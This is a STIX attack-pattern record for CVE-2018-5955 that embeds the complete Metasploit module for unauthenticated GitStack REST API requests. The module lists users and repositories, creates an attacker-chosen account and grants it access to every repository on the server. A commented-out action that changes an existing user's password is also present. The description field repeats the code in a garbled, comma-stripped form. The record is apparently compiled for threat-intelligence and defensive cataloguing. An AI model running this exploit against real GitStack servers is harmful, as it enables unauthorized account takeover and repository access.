{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e48a7bd1-8f5e-4647-98fa-18f0533dc63b",
    "created": "2024-08-14T16:23:52.099609Z",
    "modified": "2024-08-14T16:23:52.099613Z",
    "name": "GitStack Unauthenticated REST API Requests",
    "description": "Remove user from repositories and delete user 'List' => 'GET' 'Remove' => 'DELETE' 'RepoPath' => '/rest/repository/' 'UserPath' => '/rest/user/'  ] ] 'DefaultAction' => 'LIST' ) )  register_options( [ OptString.new('USERNAME', [false, 'User to create or modify', 'msf']) OptString.new('PASSWORD', [false, 'Password for user', 'password']) ] ) end  def get_users path = action.opts['UserPath'] begin res = send_request_cgi({ 'uri' => path 'method' => action.opts['List'] }) rescue Rex::ConnectionError, Errno::ECONNRESET => e print_error(\"Failed: #{e.class} - #{e.message}\") return end if res && res.code == 200 begin mylist = res.get_json_document mylist -= ['everyone'] rescue JSON::ParserError => e print_error(\"Failed: #{e.class} - #{e.message}\") return end mylist.each do |item| print_good(item.to_s) end end end  def get_repos path = action.opts['RepoPath'] begin res = send_request_cgi({ 'uri' => path 'method' => action.opts['List'] }) rescue Rex::ConnectionError, Errno::ECONNRESET => e print_error(\"Failed: #{e.class} - #{e.message}\") return nil end if res && res.code == 200 begin mylist = res.get_json_document return mylist rescue JSON::ParserError => e print_error(\"Failed: #{e.class} - #{e.message}\") return nil end else return nil end end  def clean_app user = datastore['USERNAME'] unless user print_error('USERNAME required') return end  mylist = get_repos if mylist # Remove user from each repository mylist.each do |item| path = \"#{action.opts['RepoPath']}#{item['name']}/user/#{user}/\" begin res = send_request_cgi({ 'uri' => path 'method' => action.opts['Remove'] }) rescue Rex::ConnectionError, Errno::ECONNRESET => e print_error(\"Failed: #{e.class} - #{e.message}\") return end  if res && res.code == 200 print_good(res.body.to_s) else print_status(\"User #{user} doesn't have access to #{item['name']}\") end end end  # Delete the user account path = \"#{action.opts['UserPath']}#{user}/\" begin res = send_request_cgi({ 'uri' => path 'method' => action.opts['Remove'] }) rescue Rex::ConnectionError, Errno::ECONNRESET => e print_error(\"Failed: #{e.class} - #{e.message}\") return end  # Check if the account was successfully deleted if res && res.code == 200 print_good(res.body.to_s) else print_error(res.body.to_s) end end  def add_user user = datastore['USERNAME'] pass = datastore['PASSWORD']  begin res = send_request_cgi({ 'uri' => action.opts['UserPath'] 'method' => action.opts['Create'] 'vars_post' => { 'username' => user 'password' => pass  }) rescue Rex::ConnectionError, Errno::ECONNRESET => e print_error(\"Failed: #{e.class} - #{e.message}\") return end if res && res.code == 200 print_good(\"SUCCESS: #{user}:#{pass}\") else print_error(res.body.to_s) return end  mylist = get_repos if mylist mylist.each do |item| path = \"#{action.opts['RepoPath']}#{item['name']}/user/#{user}/\" begin res = send_request_cgi({ 'uri' => path 'method' => action.opts['Create'] }) rescue Rex::ConnectionError, Errno::ECONNRESET => e print_error(\"Failed: #{e.class} - #{e.message}\") next end if res && res.code == 200 print_good(res.body.to_s) else print_error('Failed to add user') print_error(res.body.to_s) end end else print_error('Failed to retrieve repository list') end end  def run if ['LIST'].include?(action.name) print_status('Retrieving Users') get_users elsif ['LIST_REPOS'].include?(action.name) print_status('Retrieving Repositories') mylist = get_repos if mylist mylist.each do |item| print_good((item['name']).to_s) end else print_error('Failed to retrieve repository list') end elsif ['CLEANUP'].include?(action.name) clean_app elsif datastore['USERNAME'] && datastore['PASSWORD'] add_user else print_error('USERNAME and PASSWORD required') end end end",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/gitstack_rest.rb",
            "external_id": "gitstack_rest.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-5955"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'GitStack Unauthenticated REST API Requests',\n        'Description' => %q{\n          This modules exploits unauthenticated REST API requests in GitStack through v2.3.10.\n          The module supports requests for listing users of the application and listing\n          available repositories. Additionally, the module can create a user and add the user\n          to the application's repositories. This module has been tested against GitStack v2.3.10.\n        },\n        'Author' => [\n          'Kacper Szurek', # Vulnerability discovery and PoC\n          'Jacob Robles' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2018-5955'],\n          ['EDB', '43777'],\n          ['EDB', '44044']\n        ],\n        'DisclosureDate' => '2018-01-15',\n        'Actions' => [\n          [\n            'LIST',\n            {\n              'Description' => 'List application users',\n              'List' => 'GET',\n              'UserPath' => '/rest/user/'\n            }\n          ],\n          [\n            'CREATE',\n            {\n              'Description' => 'Create a user on the application',\n              'Create' => 'POST',\n              'List' => 'GET',\n              'UserPath' => '/rest/user/',\n              'RepoPath' => '/rest/repository/'\n            }\n          ],\n          # If this is uncommented, you will be able to change an\n          # existing user's password.\n          # After modifying the user's password, the user will be\n          # added to all available repositories.\n          # The cleanup action removes the user from all repositories\n          # and then deletes the user... so this action may not be desirable.\n          # [\n          # 'MODIFY',\n          # {\n          # 'Description' => \"Change the application user's password\",\n          # 'Create'      => 'PUT',\n          # 'List'        => 'GET',\n          # 'UserPath'    => '/rest/user/',\n          # 'RepoPath'    => '/rest/repository/'\n          # }\n          # ],\n          [\n            'LIST_REPOS',\n            {\n              'Description' => 'List available repositories',\n              'List' => 'GET',\n              'RepoPath' => '/rest/repository/'\n            }\n          ],\n          [\n            'CLEANUP',\n            {\n              'Description' => 'Remove user from repositories and delete user',\n              'List' => 'GET',\n              'Remove' => 'DELETE',\n              'RepoPath' => '/rest/repository/',\n              'UserPath' => '/rest/user/'\n            }\n          ]\n        ],\n        'DefaultAction' => 'LIST'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [false, 'User to create or modify', 'msf']),\n        OptString.new('PASSWORD', [false, 'Password for user', 'password'])\n      ]\n    )\n  end\n\n  def get_users\n    path = action.opts['UserPath']\n    begin\n      res = send_request_cgi({\n        'uri' => path,\n        'method' => action.opts['List']\n      })\n    rescue Rex::ConnectionError, Errno::ECONNRESET => e\n      print_error(\"Failed: #{e.class} - #{e.message}\")\n      return\n    end\n    if res && res.code == 200\n      begin\n        mylist = res.get_json_document\n        mylist -= ['everyone']\n      rescue JSON::ParserError => e\n        print_error(\"Failed: #{e.class} - #{e.message}\")\n        return\n      end\n      mylist.each do |item|\n        print_good(item.to_s)\n      end\n    end\n  end\n\n  def get_repos\n    path = action.opts['RepoPath']\n    begin\n      res = send_request_cgi({\n        'uri' => path,\n        'method' => action.opts['List']\n      })\n    rescue Rex::ConnectionError, Errno::ECONNRESET => e\n      print_error(\"Failed: #{e.class} - #{e.message}\")\n      return nil\n    end\n    if res && res.code == 200\n      begin\n        mylist = res.get_json_document\n        return mylist\n      rescue JSON::ParserError => e\n        print_error(\"Failed: #{e.class} - #{e.message}\")\n        return nil\n      end\n    else\n      return nil\n    end\n  end\n\n  def clean_app\n    user = datastore['USERNAME']\n    unless user\n      print_error('USERNAME required')\n      return\n    end\n\n    mylist = get_repos\n    if mylist\n      # Remove user from each repository\n      mylist.each do |item|\n        path = \"#{action.opts['RepoPath']}#{item['name']}/user/#{user}/\"\n        begin\n          res = send_request_cgi({\n            'uri' => path,\n            'method' => action.opts['Remove']\n          })\n        rescue Rex::ConnectionError, Errno::ECONNRESET => e\n          print_error(\"Failed: #{e.class} - #{e.message}\")\n          return\n        end\n\n        if res && res.code == 200\n          print_good(res.body.to_s)\n        else\n          print_status(\"User #{user} doesn't have access to #{item['name']}\")\n        end\n      end\n    end\n\n    # Delete the user account\n    path = \"#{action.opts['UserPath']}#{user}/\"\n    begin\n      res = send_request_cgi({\n        'uri' => path,\n        'method' => action.opts['Remove']\n      })\n    rescue Rex::ConnectionError, Errno::ECONNRESET => e\n      print_error(\"Failed: #{e.class} - #{e.message}\")\n      return\n    end\n\n    # Check if the account was successfully deleted\n    if res && res.code == 200\n      print_good(res.body.to_s)\n    else\n      print_error(res.body.to_s)\n    end\n  end\n\n  def add_user\n    user = datastore['USERNAME']\n    pass = datastore['PASSWORD']\n\n    begin\n      res = send_request_cgi({\n        'uri' => action.opts['UserPath'],\n        'method' => action.opts['Create'],\n        'vars_post' => {\n          'username' => user,\n          'password' => pass\n        }\n      })\n    rescue Rex::ConnectionError, Errno::ECONNRESET => e\n      print_error(\"Failed: #{e.class} - #{e.message}\")\n      return\n    end\n    if res && res.code == 200\n      print_good(\"SUCCESS: #{user}:#{pass}\")\n    else\n      print_error(res.body.to_s)\n      return\n    end\n\n    mylist = get_repos\n    if mylist\n      mylist.each do |item|\n        path = \"#{action.opts['RepoPath']}#{item['name']}/user/#{user}/\"\n        begin\n          res = send_request_cgi({\n            'uri' => path,\n            'method' => action.opts['Create']\n          })\n        rescue Rex::ConnectionError, Errno::ECONNRESET => e\n          print_error(\"Failed: #{e.class} - #{e.message}\")\n          next\n        end\n        if res && res.code == 200\n          print_good(res.body.to_s)\n        else\n          print_error('Failed to add user')\n          print_error(res.body.to_s)\n        end\n      end\n    else\n      print_error('Failed to retrieve repository list')\n    end\n  end\n\n  def run\n    if ['LIST'].include?(action.name)\n      print_status('Retrieving Users')\n      get_users\n    elsif ['LIST_REPOS'].include?(action.name)\n      print_status('Retrieving Repositories')\n      mylist = get_repos\n      if mylist\n        mylist.each do |item|\n          print_good((item['name']).to_s)\n        end\n      else\n        print_error('Failed to retrieve repository list')\n      end\n    elsif ['CLEANUP'].include?(action.name)\n      clean_app\n    elsif datastore['USERNAME'] && datastore['PASSWORD']\n      add_user\n    else\n      print_error('USERNAME and PASSWORD required')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-01-15"
}